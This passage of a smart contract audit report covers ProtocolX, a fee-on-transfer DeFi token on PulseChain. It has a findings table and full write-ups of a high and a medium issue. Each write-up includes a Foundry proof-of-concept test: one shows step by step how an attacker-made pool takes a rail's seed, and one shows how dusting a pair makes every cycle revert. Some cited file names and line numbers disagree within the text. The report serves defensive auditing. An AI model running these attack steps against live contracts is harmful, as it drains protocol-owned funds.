# 1. About Shieldify

Positioned as the first hybrid Web3 Security company, Shieldify shakes things up with a unique subscription-based auditing model that entitles the customer to unlimited audits within its duration, as well as top-notch service quality thanks to a disruptive 6-layered security approach. The company works with very well-established researchers in the space and has secured multiple millions in TVL across protocols, also can audit codebases written in Solidity, Vyper, Rust, Cairo, Move and Go.

Learn more about us at [shieldify.org](https://shieldify.org/).

# 2. Disclaimer

This security review does not guarantee bulletproof protection against a hack or exploit. Smart contracts are a novel technological feat with many known and unknown risks. The protocol, which this report is intended for, indemnifies Shieldify Security against any responsibility for any misbehavior, bugs, or exploits affecting the audited code during any part of the project's life cycle. It is also pivotal to acknowledge that modifications made to the audited code, including fixes for the issues described in this report, may introduce new problems and necessitate additional auditing.

# 3. About ProtocolX

Inflow: Protocol X ($IPX) is a fee-on-transfer DeFi protocol on PulseChain. A 0.5% buy and sell tax, taken in IPX, flows into a vault, and every taxable sell triggers a cycle that converts part of the vault's IPX into WPLS and a stable token and deploys it as protocol-owned liquidity, locked for 5,555 days.

At a high level, the main functionalities are:

- `IPXToken` is a fixed-supply (1,000,000,000 IPX) fee-on-transfer ERC20 that triggers the vault cycle on sells, gates trading on a completed TWAP window and supports a 30-day time-locked `VaultController` migration
- `VaultController` holds the IPX, WPLS and stable vaults, runs the cycle, computes the vault surplus (D) and the locked POL value (B), and holds the protected rail seed
- `ConversionModule` sells vault IPX in tiered legs, `LiquidityDeployer` adds liquidity to the IPX pools and locks the LP, and `ExpansionModule` drives stage progression, opening and seeding the PRVX, PLSX, INC and pHEX rail pools
- `TWAPOracle`, `ArbitrageMonitor` and `TreasuryController` provide TWAP pricing, arbitrage zones and the treasury activation, while `LpLocker` and `TeamLocker` hold the locked POL and team allocation

# 4. Risk Classification

|        Severity        | Impact: High | Impact: Medium | Impact: Low |
| :--------------------: | :----------: | :------------: | :---------: |
|  **Likelihood: High**  |   Critical   |      High      |   Medium    |
| **Likelihood: Medium** |     High     |     Medium     |     Low     |
|  **Likelihood: Low**   |    Medium    |      Low       |     Low     |

## 4.1 Impact

- **High** - results in a significant risk for the protocol’s overall well-being. Affects all or most users
- **Medium** - results in a non-critical risk for the protocol affects all or only a subset of users, but is still
  unacceptable
- **Low** - losses will be limited but bearable, and covers vectors similar to griefing attacks that can be easily repaired

## 4.2 Likelihood

- **High** - almost certain to happen and highly lucrative for execution by malicious actors
- **Medium** - still relatively likely, although only conditionally possible
- **Low** - requires a unique set of circumstances and poses non-lucrative cost-of-execution to rewards ratio for the actor

# 5. Security Review Summary

The security review lasted 12 days with a total of 192 hours dedicated to the audit by the Shieldify team.

Overall, the code is well-written. The audit report contributed by identifying one High, two Medium, ten Low and twenty Informational severity issues. They’re mainly related to the manipulation of rail seeding through attacker-controlled route pools, integration mismatches with live PulseX V1 pools, TWAP versus spot pricing gaps in the conversion and valuation paths, migration state handling, and inconsistencies between the documentation and the code.

The ProtocolX team has done a great job with their test suite and provided support and responses to all of the questions that the Shieldify researchers had.

## 5.1 Protocol Summary

| **Project Name**             | ProtocolX                                                                                                                                          |
| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Repository**               | [Audit-InflowProtocolX](https://github.com/InflowProtocolX/Audit-InflowProtocolX)                                                                  |
| **Type of Project**          | Fee-on-Transfer Token & Protocol-Owned Liquidity Engine                                                                                            |
| **Security Review Timeline** | 12 days                                                                                                                                            |
| **Review Commit Hash**       | [35b939c1e8c54c7d3c7c693eaf13035998306cff](https://github.com/InflowProtocolX/Audit-InflowProtocolX/tree/35b939c1e8c54c7d3c7c693eaf13035998306cff) |
| **Fixes Review Commit Hash** | [d0fa79fcef772de7e2c2def3299160d9b2ddb7b5](https://github.com/InflowProtocolX/Audit-InflowProtocolX/tree/d0fa79fcef772de7e2c2def3299160d9b2ddb7b5) |

## 5.2 Scope

The following smart contracts were in the scope of the security review:

| File                       | nSLOC |
| -------------------------- | :---: |
| src/ExpansionModule.sol    |  743  |
| src/IPXToken.sol           |  220  |
| src/ArbitrageMonitor.sol   |  174  |
| src/lockers/Locker.sol     |  63   |
| src/lockers/LpLocker.sol   |   6   |
| src/lockers/TeamLocker.sol |   6   |
| src/VaultController.sol    |  745  |
| src/TWAPOracle.sol         |  292  |
| src/LiquidityDeployer.sol  |  423  |
| src/TreasuryController.sol |  85   |
| src/InflowConstants.sol    |  149  |
| src/ConversionModule.sol   |  357  |
| Total                      | 3263  |

# 6. Findings Summary

The following number of issues have been identified, sorted by their severity:

- **High** issues: 1
- **Medium** issues: 2
- **Low** issues: 10
- **Info** issues: 20

| **ID** | **Title**                                                                                                                                                                                                          | **Severity** | **Status** |
| :----: | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | :----------: | :--------: |
| [H-01] | Liquidity Added in the Same Transaction Lets an Attacker's Thin Stable/Rail Pool Pass the Depth Check and Take a Rail's Opening Seed                                                                               |     High     |   Fixed    |
| [M-01] | The Dusted-Pair Seed Calls a `mint` That PulseX Pairs Do Not Have, so 1 Wei Sent to the IPX/Rail Pair Makes Every Cycle Revert                                                                                     |    Medium    |   Fixed    |
| [M-02] | Rail Seeds Need Route Pools at Least 50 Times the Seed, Which Live PulseX Pools Do Not Have, so the Shipped V1 Configuration Cannot Open Any Rail                                                                  |    Medium    |   Fixed    |
| [L-01] | A Declined WPLS Conversion Leg Still Starts the Cooldown, so a Seller Can Block IPX-to-WPLS Conversion                                                                                                             |     Low      |   Fixed    |
| [L-02] | The First Rail Seed Into an Empty Pair Is Priced Only From TWAPs, so a Sharp IPX Price Move Lets Arbitrage Take Part of the Seed                                                                                   |     Low      |   Fixed    |
| [L-03] | A Seller Can Make a Round Convert but Add No Liquidity and Still Start the Cooldown, so Base Liquidity Stops Growing                                                                                               |     Low      |   Fixed    |
| [L-04] | A Migration That Replaces an Active Rail Keeps That Slot's Active Flag, so the New Rail Is Never Seeded and the Next Rail Can Never Open                                                                           |     Low      |   Fixed    |
| [L-05] | Permissionless Cycle Triggers Allow Rail Purchases at an Attacker-Selected Price Within the Slippage Tolerance                                                                                                     |     Low      |   Fixed    |
| [L-06] | Rail-Pair POL Is Valued Through the Rail Pair's Own Pinned TWAP, so a Held Skew Over-Reads B and the $25K Rail Gate                                                                                                |     Low      |   Fixed    |
| [L-07] | A Third Party Can Shape the IPX/Rail Pair so the Rail Is Skipped Every Cycle (Progression Stall)                                                                                                                   |     Low      |   Fixed    |
| [L-08] | Combined Audit Fixes Push VaultController 281 Bytes Over the Deployment Size Limit                                                                                                                                 |     Low      |   Fixed    |
| [L-09] | Protocol-Owned Liquidity Earns No Swap Fees on PulseX V1                                                                                                                                                           |     Low      |   Fixed    |
| [L-10] | A Temporary Drop in Observed Route Liquidity Can Delay Rail Progression and Restrict Swaps                                                                                                                         |     Low      |   Fixed    |
| [I-01] | The Protected Rail Seed Keeps Filling While the Next Rail Cannot Open, and the Owner Cannot Pause or Release It                                                                                                    |     Info     |   Fixed    |
| [I-02] | A Zero Sell Tax Is Documented as a Pause, but the Keeper's `poke()` Still Runs the Cycle                                                                                                                           |     Info     |   Fixed    |
| [I-03] | An IPX/Rail Pair That Was Created but Never Synced Bypasses the Dust Checks, so the First Rail Seed Opens at a Price Set by Whoever Sent Tokens to the Pair                                                        |     Info     |   Fixed    |
| [I-04] | WPLS Is Valued at the Live Anchor Spot (Inside the 20% Guard) for D, Fundable USD and the LiquidityDeployer Treasury Cap                                                                                           |     Info     |   Fixed    |
| [I-05] | ArbitrageMonitor's Live-TWAP Confirmation Needs Only a Few Percent of the Span Held, Not the Half-Window Its NatSpec Claims                                                                                        |     Info     |   Fixed    |
| [I-06] | An Issuer Freeze, Pause or Blacklist on the Stable Reverts Every Eligible Cycle Until a Timelocked Wallet Change or a Migration                                                                                    |     Info     |   Fixed    |
| [I-07] | An IPX/Stable Push Held at Every Cycle Trigger Forces Partial-Then-Deferred Rounds and Starves Seed Funding and Deployment                                                                                         |     Info     |   Fixed    |
| [I-08] | Conversion Sells Are Bounded Only by the TWAP Deviation Band, and the Seller Who Triggers a Round Trades After Them                                                                                                |     Info     |   Fixed    |
| [I-09] | A Permissionless Actor Can Make a Triggered Cycle Fail or Skip Conversion by Capping a Sell's Gas or by Pumping Spot Ahead of the Trigger                                                                          |     Info     |   Fixed    |
| [I-10] | A Stage-Opening Rail Seed Is Sized Against the Old Stage's Stable Floor, Leaving the Vault Below the New Floor                                                                                                     |     Info     |   Fixed    |
| [I-11] | Placed-Liquidity, POL and Gate Figures Measure a Different Quantity From the One Their Documentation Describes                                                                                                     |     Info     |   Fixed    |
| [I-12] | State Carried Across a VaultController Migration Can Be Incomplete or Misreported                                                                                                                                  |     Info     |   Fixed    |
| [I-13] | Migration Hooks and the IPX/WPLS Rescue Block Ignore the Vault's Migration Status, so `lockModules()` Does Not Close the POL Depositor Registry Before Launch and a Retired Vault's IPX and WPLS Cannot Be Rescued |     Info     |   Fixed    |
| [I-14] | The `openTrading()` Oracle Gate Checks Less Than Its Comment Claims, and the `TWAPOracle` Pair-Registry Functions Check Less Than Their Purpose Requires                                                           |     Info     |   Fixed    |
| [I-15] | `setTWAPOracle()` Accepts Zero After Launch and Unusable Addresses, Contrary to Parts of the Documentation, and Four Comments Misstate When the Spot-Guard Reference Moves                                         |     Info     |   Fixed    |
| [I-16] | Privileged Functions and Constructors Skip Input or State Guards, so a Wrong Value or a Repeated Call Goes Through Instead of Reverting                                                                            |     Info     |   Fixed    |
| [I-17] | Owner Levers Take Effect Outside Any Binding Notice, and Fee Exemptions and Vault Privileges Are Not Scoped to the Roles They Serve                                                                                |     Info     |   Fixed    |
| [I-18] | ArbitrageMonitor NatSpec Understates TWAP-Composition Bias, and `getD()` Cannot Distinguish Guard Failure From Zero Surplus                                                                                        |     Info     |   Fixed    |
| [I-19] | Several Events Misreport What Happened, so Logs Cannot Be Used to Reconstruct Protocol Activity                                                                                                                    |     Info     |   Fixed    |
| [I-20] | Documentation and NatSpec Contradict the Code, and `_addLiquidityStable()` Carries a Dead Computation                                                                                                              |     Info     |   Fixed    |

# 7. Findings

# [H-01] Liquidity Added in the Same Transaction Lets an Attacker's Thin Stable/Rail Pool Pass the Depth Check and Take a Rail's Opening Seed

## Severity

High Risk

## Description

When a rail opens, the protocol swaps a fixed seed of about $5,000 of vault stable into the rail token, then pairs it with reserve IPX in a new IPX/rail pool.

The swap can take two routes: directly through the stable/rail pool, or through the stable/WPLS and WPLS/rail pools. The protocol finds these pools with `factory.getPair()`, so it uses whatever pool exists, including one an attacker created. Before it uses a route, it checks that:

1. each pool on the route has a completed TWAP window,
2. each pool's current price is within 5% of its TWAP,
3. the swap input is at most 2% of each pool's reserve of the input token (the "hop cap", the only check on how deep a pool is), and
4. the swap would return at least 97% of the amount the TWAP gives.

The hop cap reads the pool's reserves at the moment of the swap. That swap runs inside the transaction that triggers the cycle, and anyone can trigger the cycle with a small taxed sell. So the person who triggers it can first add liquidity to a pool, and a pool that was nearly empty for its whole TWAP window passes as deep.

The attack:

1. The attacker creates the stable/rail pool with about $0.01 of liquidity, priced at 50 times the rail's real price. A pool this small is not worth arbitraging, so the price stays there.
2. While the rail is due, the protocol retries the seed every cycle. The next attempt registers the attacker's pool with the oracle. One TWAP window later, the pool has a completed window at the attacker's price. Anyone can pin it with `update()`, so the attacker does not have to wait for someone else.
3. In one transaction, the attacker adds about $300,000 of stable and the matching rail to the pool at the same price, then triggers the cycle with a 200-wei taxed IPX sell. The pool now passes all four checks, because its current price equals its TWAP and the seed is under 2% of its new reserve.
4. The protocol swaps its $5,000 seed in the attacker's pool and receives rail worth about 1/50 of that. It then opens the new IPX/rail pool with about $5,000 of IPX (sized from the TWAP) against that small amount of rail, so the IPX in the new pool is about 50 times too cheap.
5. The attacker withdraws its liquidity, which now holds the protocol's $5,000, and buys the cheap IPX out of the new pool.

The attack works whenever the attacker's pool is the only route that passes the checks at that moment. On the PulseX V1 pools that the deploy script uses by default, this is already true for the first rail, PRVX. At block 28,014,811, V1 has no USDC/PRVX pool, and its WPLS/PRVX pool holds about 657,000 WPLS (about $3.50), far below the roughly 46 billion WPLS the hop cap needs. Where another route does pass, the attacker can also push that pool more than 5% off its TWAP in the same transaction, and the PoC does this. In that case, the attacker's transaction has to run before any other cycle that comes after the TWAP window completes, because that cycle would open the rail through the honest route.

The attacker needs about $250,000 of USDC and about $6,000 worth of the rail token for the length of one transaction, and gets all of it back.

There are two causes. The route pools come from the factory without any approval, so a pool the attacker created can be the price source. And the hop cap measures pool depth from live reserves, which the transaction that triggers the cycle can change.

## Location of Affected Code

File: [src/ExpansionModule.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol)

- `_twapHopOut()` (L1194-L1239)
- `_twapRouteOut()` (L1154-L1173)
- `_routeQuote()` (L1100-L1137)
- `_clearsFloor()` (L1143-L1149)
- `_minRailOut()` (L1271-L1273)
- `_ordered()` (L1377-L1384)
- `_planSeed()` (L887-L965)
- `_ipxLegForRail()` (L1076-L1083)
- `_swapStableForToken()` (L1244-L1266)
- `railTwapPairs()` (L414-L431)

File: [src/TWAPOracle.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/TWAPOracle.sol)

- `registerPairFromExpansion()` (L271-L286)
- `update()` (L327-L344)

## Impact

Anyone can take most of the value the protocol puts into a new rail, in one transaction and without any privileges. In the PoC the protocol puts $5,000 of stable and $4,975 of reserve IPX into the PRVX rail and is left with $1,398 of liquidity, a loss of about $8,600 (86%). The attacker makes $7,575. The protocol funds each seed by setting aside part of every conversion round (30.5% before the first rail opens), and all four rails open through the same code with a seed of about $5,000 each.

## Proof of Concept

The test first shows an honest seed (the control), which buys $4,959 of PRVX. Then it runs the attack. Its honest route holds $5M of WPLS, so the attacker also pushes that pool more than 5% off its TWAP in the attack transaction.

The test uses the repository's mock pools. Every protocol step in it uses router calls that PulseX supports. Only the attacker's last step, withdrawing its liquidity, calls the mock pool's `burn()` directly; on PulseX, the same step goes through the router's `removeLiquidity()`.

Add the test below as `test/audit/issues/H-01.t.sol` and run:

```bash
forge test --match-path test/audit/issues/H-01.t.sol -vv
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {InflowFixture} from "../../InflowFixture.sol";
import {InflowConstants} from "../../../src/InflowConstants.sol";
import {MockUniswapV2Pair} from "../../mocks/MockUniswapV2Pair.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {console2} from "forge-std/console2.sol";

contract Issue_H01 is InflowFixture {
    address internal attacker = makeAddr("attacker");
    address internal routePair;
    address internal direct;

    function setUp() public override {
        super.setUp();
        _prepareLockedPolB(150_000e6);
        _seedRailPair(prvx, 500_000_000e18, 5_000_000e18);
        routePair = factory.getPair(address(wpls), address(prvx));
        usdc.mint(attacker, 10_000);
        prvx.mint(attacker, 2e16);
        vm.startPrank(attacker);
        usdc.approve(address(router), type(uint256).max);
        prvx.approve(address(router), type(uint256).max);
        wpls.approve(address(router), type(uint256).max);
        router.addLiquidity(address(usdc), address(prvx), 10_000, 2e16, 0, 0, attacker, type(uint256).max);
        vm.stopPrank();
        direct = factory.getPair(address(usdc), address(prvx));
        _fundSeedBucket(expansion.seedTarget());
    }

    function test_attackerRoutePoolTakesRailSeed() public {
        uint256 seed = InflowConstants.railSeedUsd(0);

        vm.prank(bob);
        ipx.transfer(ipxWplsPair, 200);
        (,,, bool tracked,,,,) = twapOracle.snapshots(direct);
        assertTrue(tracked, "attacker pool registered by the cycle");
        assertFalse(expansion.prvxActive(), "first attempt skipped");

        vm.warp(block.timestamp + twapOracle.windowSeconds() + 1);
        twapOracle.update(direct);
        twapOracle.update(routePair);

        uint256 snap = vm.snapshotState();
        vm.prank(bob);
        ipx.transfer(ipxWplsPair, 200);
        uint256 honestPrvxUsd = _usd(address(prvx), prvx.balanceOf(factory.getPair(address(ipx), address(prvx))));
        assertGt(honestPrvxUsd, (seed * 95) / 100, "control: seed bought PRVX at market");
        vm.revertToState(snap);

        usdc.mint(attacker, 300_000e6);
        prvx.mint(attacker, 600_001e18);
        wpls.mint(attacker, 175_000e18);
        deal(address(ipx), attacker, 1e18);
        uint256 value0 = _value(attacker);
        uint256 directUsdc0 = usdc.balanceOf(direct);

        vm.startPrank(attacker);
        uint256 prvxFromPush = _swap(address(wpls), address(prvx), 175_000e18);
        router.addLiquidity(address(usdc), address(prvx), 300_000e6, 600_001e18, 0, 0, attacker, type(uint256).max);
        ipx.transfer(ipxWplsPair, 200);
        address railPair = factory.getPair(address(ipx), address(prvx));
        uint256 protocolPrvx = prvx.balanceOf(railPair);
        uint256 seedIpx = ipx.balanceOf(railPair);
        uint256 seedThroughAttacker = usdc.balanceOf(direct) - directUsdc0 - 300_000e6;
        IERC20(direct).transfer(direct, IERC20(direct).balanceOf(attacker));
        MockUniswapV2Pair(direct).burn(attacker);
        uint256 prvxIn = Math.sqrt(prvx.balanceOf(railPair) * ipx.balanceOf(railPair) / _ipxPerPrvx() * 1e18)
            - prvx.balanceOf(railPair);
        _swap(address(prvx), address(ipx), prvxIn);
        _swap(address(prvx), address(wpls), prvxFromPush);
        vm.stopPrank();

        int256 pnl = int256(_value(attacker)) - int256(value0);
        uint256 protocolPrvxUsd = _usd(address(prvx), protocolPrvx);
        uint256 polUsd = (_usd(address(ipx), ipx.balanceOf(railPair)) + _usd(address(prvx), prvx.balanceOf(railPair)))
            * IERC20(railPair).balanceOf(address(lpLocker)) / IERC20(railPair).totalSupply();
        console2.log("vault seed paid into attacker pool ($):", seedThroughAttacker / 1e6);
        console2.log("PRVX the protocol received, honest control ($):", honestPrvxUsd / 1e6);
        console2.log("PRVX the protocol received, attack ($):", protocolPrvxUsd / 1e6);
        console2.log("reserve IPX the seed put into IPX/PRVX ($):", _usd(address(ipx), seedIpx) / 1e6);
        console2.log("protocol's IPX/PRVX LP value after the arbitrage ($):", polUsd / 1e6);
        console2.log("attacker net profit ($):", pnl / 1e6);

        assertTrue(expansion.prvxActive(), "PRVX rail opened");
        assertEq(seedThroughAttacker, seed, "the whole seed was swapped in the attacker pool");
        assertLt(protocolPrvxUsd, seed / 40, "protocol got under 1/40 of the seed's value in PRVX");
        assertLt(polUsd, 2_000e6, "~$10K of seed stable and reserve IPX left under $2K of POL");
        assertGt(pnl, 7_000e6, "attacker nets over $7K in one transaction");
    }

    function _swap(address tokenIn, address tokenOut, uint256 amountIn) internal returns (uint256 out) {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        uint256 before = IERC20(tokenOut).balanceOf(attacker);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path, attacker, type(uint256).max);
        out = IERC20(tokenOut).balanceOf(attacker) - before;
    }

    function _ipxPerPrvx() internal view returns (uint256) {
        return twapOracle.consult(ipxWplsPair, address(wpls), twapOracle.consult(routePair, address(prvx), 1e18));
    }

    function _usd(address token, uint256 amount) internal view returns (uint256) {
        if (amount == 0) return 0;
        if (token == address(usdc)) return amount;
        uint256 w = amount;
        if (token == address(prvx)) w = twapOracle.consult(routePair, address(prvx), amount);
        if (token == address(ipx)) w = twapOracle.consult(ipxWplsPair, address(ipx), amount);
        return twapOracle.consult(wplsUsdcPair, address(wpls), w);
    }

    function _value(address who) internal view returns (uint256) {
        return _usd(address(usdc), usdc.balanceOf(who)) + _usd(address(wpls), wpls.balanceOf(who))
            + _usd(address(prvx), prvx.balanceOf(who)) + _usd(address(ipx), ipx.balanceOf(who));
    }
}
```

## Recommendation

Do not use a pool for a rail's first seed only because `factory.getPair()` returns it. Let the owner approve the route pools for each rail, and skip the seed when no approved route passes the checks. A pool the attacker created is then never a price source, whatever its reserves are at the moment of the swap.

In addition, measure depth over the TWAP window instead of only at the swap: record each approved route pool's reserves at the start and end of every completed window, and apply the hop cap to the lowest of the window-start, window-end and current reserve.

## Team Response

Fixed.

# [M-01] The Dusted-Pair Seed Calls a `mint` That PulseX Pairs Do Not Have, so 1 Wei Sent to the IPX/Rail Pair Makes Every Cycle Revert

## Severity

Medium Risk

## Description

When a rail comes due, `ExpansionModule._try()` opens the IPX/rail pool with the rail's seed. Anyone can create that pair first and leave it "dusted": a few wei of reserves and no LP minted. The router cannot seed a pair in that state, so `_try()` sends both seed legs straight to the pair and calls `mint(address)` on it. A pair with only dust LP minted takes the same path.

PulseX pairs have no `mint(address)`. Their mint is `mint(address to, address senderOrigin)`, so the call reverts. This is true of pairs from the factory the protocol ships with (PulseX V1) and of PulseX V2 pairs. The branch was only ever tested against `MockUniswapV2Pair`, which uses the Uniswap signature, and the fork suites add liquidity through the router, so they never reach it.

`VaultController._runCycle()` calls `checkExpansion()` without a `try` block, before conversion and deployment, so the revert takes the whole cycle with it. The token catches it and emits `CycleFailed`, which lets the sell settle, but nothing is converted or deployed and the cooldown never starts. The rail stays due, so every later cycle fails the same way, and the keeper's `poke()` reverts too.

The trigger costs only gas: create the IPX/rail pair, send it 1 wei of the rail token, and call `sync()`. On today's shallow V1 pools, the PRVX seed is stopped earlier by the route-depth gate, so this is the next thing the seed hits once it can route.

## Location of Affected Code

File: [src/ExpansionModule.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol)

- `_try()` (L639-L826)
  - dusted-pair check (L680-L695)
  - direct mint (L784-L795)

File: [src/interfaces/IUniswapV2Pair.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/interfaces/IUniswapV2Pair.sol)

- `mint()` (L17)

File: [src/VaultController.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol)

- `_runCycle()` (L409-L626)
- `poke()` (L403-L407)

File: [src/IPXToken.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/IPXToken.sol)

- `_update()` (L384-L446)

## Impact

Once a rail is due, anyone can stall the protocol for the cost of gas. Every cycle reverts, so no IPX is converted, no liquidity is deployed and the rail seed never leaves the vault, while sells keep settling. Neither `poke()` nor a later window gets past it. The owner can only stop the reverts by turning expansion off, which also halts every rail and the treasury stage, or by moving the pair out of the dust range by hand.

## Proof of Concept

Add the test below as `test/audit/issues/M-02.t.sol` and run:

```bash
forge test --match-path test/audit/issues/M-02.t.sol -vv
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {InflowFixture} from "../../InflowFixture.sol";
import {InflowConstants, InflowAddresses} from "../../../src/InflowConstants.sol";
import {MockERC20} from "../../mocks/MockERC20.sol";
import {MockUniswapV2Pair} from "../../mocks/MockUniswapV2Pair.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPulseXFactory {
    function createPair(address, address) external returns (address);
}

interface IPulseXPair {
    function sync() external;
}

contract Issue_M02 is InflowFixture {
    bytes4 internal constant MINT_UNISWAP = 0x6a627842; // mint(address)
    bytes4 internal constant MINT_PULSEX = 0xee1fe2ad; // mint(address,address)
    address internal constant PULSEX_V2_FACTORY = 0x29eA7545DEf87022BAdc76323F373EA1e707C523;

    event CycleFailed(bytes reason);

    function test_dustedRailPairRevertsEveryCycleOnPulseX() public {
        _seedExpansionPools(); // PRVX rail is due and its seed is funded
        _topUpVault(0, 50_000e6);

        // Attacker: create IPX/PRVX, send 1 wei PRVX, sync. Reserves, no LP.
        address pair = factory.createPair(address(ipx), address(prvx));
        prvx.mint(pair, 1);
        MockUniswapV2Pair(pair).sync();
        assertEq(IERC20(pair).totalSupply(), 0, "pair is dusted");

        uint256 vaultIpx0 = ipx.balanceOf(address(vault));
        uint256 lockedLp0 = IERC20(ipxWplsPair).balanceOf(address(lpLocker));

        // Control: with a Uniswap-style mint the same sell seeds, converts and deploys.
        uint256 snap = vm.snapshotState();
        vm.prank(alice);
        ipx.transfer(ipxUsdcPair, 1e18);
        assertTrue(expansion.prvxActive(), "control: PRVX seeded");
        assertGt(vault.lastExecutionTime(), 0, "control: cooldown started");
        assertLt(ipx.balanceOf(address(vault)), vaultIpx0, "control: IPX converted");
        assertGt(IERC20(ipxWplsPair).balanceOf(address(lpLocker)), lockedLp0, "control: POL deployed");
        vm.revertToState(snap);

        // Make the pair behave like PulseX: no `mint(address)`.
        vm.mockCallRevert(pair, abi.encodeWithSelector(MINT_UNISWAP), "");

        // A taxed sell in this window and one in the next: both cycles revert.
        vm.expectEmit(address(ipx));
        emit CycleFailed("");
        vm.prank(alice);
        ipx.transfer(ipxUsdcPair, 1e18);

        vm.warp(block.timestamp + InflowConstants.COOLDOWN_PERIOD + 1);
        vm.expectEmit(address(ipx));
        emit CycleFailed("");
        vm.prank(bob);
        ipx.transfer(ipxUsdcPair, 1e18);

        // Nothing seeded, converted or deployed, and the cooldown never started.
        assertFalse(expansion.prvxActive(), "PRVX seeded");
        assertEq(vault.lastExecutionTime(), 0, "cooldown started");
        assertGe(ipx.balanceOf(address(vault)), vaultIpx0, "vault IPX converted");
        assertEq(IERC20(ipxWplsPair).balanceOf(address(lpLocker)), lockedLp0, "POL deployed");

        // The keeper cannot get around it.
        vm.prank(owner);
        vm.expectRevert();
        vault.poke();

        // Real PulseX pairs (V1 and V2) reject `mint(address)` and accept `mint(address,address)`.
        vm.createSelectFork("https://rpc.pulsechain.com", 28_014_811);
        _assertPulseXMint(InflowAddresses.PULSEX_FACTORY);
        _assertPulseXMint(PULSEX_V2_FACTORY);
    }

    function _assertPulseXMint(address pxFactory) internal {
        MockERC20 a = new MockERC20("A", "A", 18);
        MockERC20 b = new MockERC20("B", "B", 18);
        address p = IPulseXFactory(pxFactory).createPair(address(a), address(b));
        a.mint(p, 1);
        b.mint(p, 1);
        IPulseXPair(p).sync(); // dusted
        a.mint(p, 1e18); // both seed legs sent, as _try does
        b.mint(p, 1e18);

        (bool okUniswap,) = p.call(abi.encodeWithSelector(MINT_UNISWAP, address(this)));
        assertFalse(okUniswap, "PulseX pair accepted mint(address)");
        (bool okPulseX,) = p.call(abi.encodeWithSelector(MINT_PULSEX, address(this), address(this)));
        assertTrue(okPulseX, "PulseX pair rejected mint(address,address)");
    }
}
```

## Recommendation

In the dust branch, call the mint PulseX pairs actually have: declare `mint(address to, address senderOrigin)` in the pair interface and call `mint(address(this), address(this))`.

## Team Response

Fixed.

# [M-02] Rail Seeds Need Route Pools at Least 50 Times the Seed, Which Live PulseX Pools Do Not Have, so the Shipped V1 Configuration Cannot Open Any Rail

## Severity

Medium Risk

## Description

Each rail seed is a fixed amount of about $5,000 of stable, swapped into the rail token through the stable/WPLS/rail route or a direct stable/rail pool. Every hop has a size cap: the input may be at most 2% of the pool's input reserve, so each hop needs a pool roughly 50 times the seed, about $250,000. The seed is never reduced or split. A route that fails the cap is skipped, and the rail waits for the next cycle.

Rails open strictly in order (`ExpansionModule.sol` L349-L352), so the first rail (PRVX) gates every later rail and the treasury stage. The factory is immutable (L35), nothing checks route depth before the deploy script calls `lockRails()` (`Deploy.s.sol` L364), and the rail list cannot change afterwards.

On live PulseChain, the route pools are far too shallow (block 28,014,811, see the table under the PoC):

- PulseX V1, the factory the protocol ships with: the WPLS/USDC anchor clears the first hop, but the WPLS/PRVX pool holds about 657K WPLS (about $3.50) against the roughly 46B WPLS the cap requires, and no USDC/PRVX pool exists. PRVX can never be seeded, so no rail opens. The problem is not limited to the first rail: even if PRVX opened, INC (34.1B WPLS) and pHEX (27.5B WPLS) also fail the second hop, and their direct USDC pools hold about $93 and $0.28.
- PulseX V2: the WPLS/USDC anchor holds only about $9.8K, so the first hop fails on every route through WPLS. PRVX can open through its direct USDC/PRVX pool (about $365K), but PLSX, INC and pHEX have no direct pool deep enough, so expansion stops after the first rail.

The documentation does not match the shipped defaults either. `AUDIT_BRIEF.md` (L41) says the protocol runs on "PulseX V2 on mainnet", while `InflowConstants.sol` (L336-L337) and `Deploy.s.sol` (L91-L92) default to the V1 router and factory (the V1 router's `factory()` returns `0x1715…`). Two code comments are stale as well: `InflowConstants.sol` L178-L180 assumes an anchor of about $500K, but it holds about $318K, which leaves the first hop only about 27% headroom, and L274 claims "the seed never outgrows the route hop cap".

A fixed seed size combined with a strict depth requirement, with no check that the real route pools meet it.

## Location of Affected Code

File: [src/ExpansionModule.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol)

- `factory` (L35)
- `lockRails()` (L287-L291)
- `checkExpansion()` (L331-L386): rail ordering (L349-L352)
- `_try()` (L639-L826)
- `_routeQuote()` (L1100-L1137)
- `_twapHopOut()` (L1194-L1239)

File: [src/InflowConstants.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/InflowConstants.sol)

- `EXPANSION_HOP_CAP_BPS` and its comment (L173-L181)
- seed-size comment (L268-L276)
- `railSeedUsd()` (L284-L289)
- `PULSEX_ROUTER` and `PULSEX_FACTORY` (L336-L337)

File: [script/Deploy.s.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/script/Deploy.s.sol)

- `run()`: router and factory defaults (L98-L99), `lockRails()` call (L372)

File: [AUDIT_BRIEF.md](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/AUDIT_BRIEF.md)

- "PulseX V2 on mainnet" (L45)

## Impact

